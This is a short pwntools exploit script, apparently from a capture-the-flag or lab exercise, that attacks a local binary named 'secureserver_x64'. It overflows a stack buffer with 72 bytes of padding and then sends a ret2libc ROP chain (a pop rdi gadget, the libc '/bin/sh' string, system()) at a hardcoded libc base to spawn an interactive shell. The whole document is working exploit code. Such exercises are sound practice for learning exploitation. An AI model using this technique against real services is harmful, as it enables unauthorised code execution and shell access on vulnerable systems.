from pwn import *

exe = './secureserver_x64'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

libc.address = 0x00007ffff7dc6000
pop_rdi = 0x40120b

padding = 72

io = process(exe)


info('libc_base: %#x', libc.address)

info('system_addr: %#x', libc.symbols.system)
binsh = next(libc.search(b'/bin/sh\x00'))
info('bin_sh: %#x', binsh)

payload = flat({
        padding:[
            pop_rdi,
            binsh,
            libc.symbols.system
            ]
    })

write('payload', payload)

io.sendlineafter(b':', payload)

io.interactive()

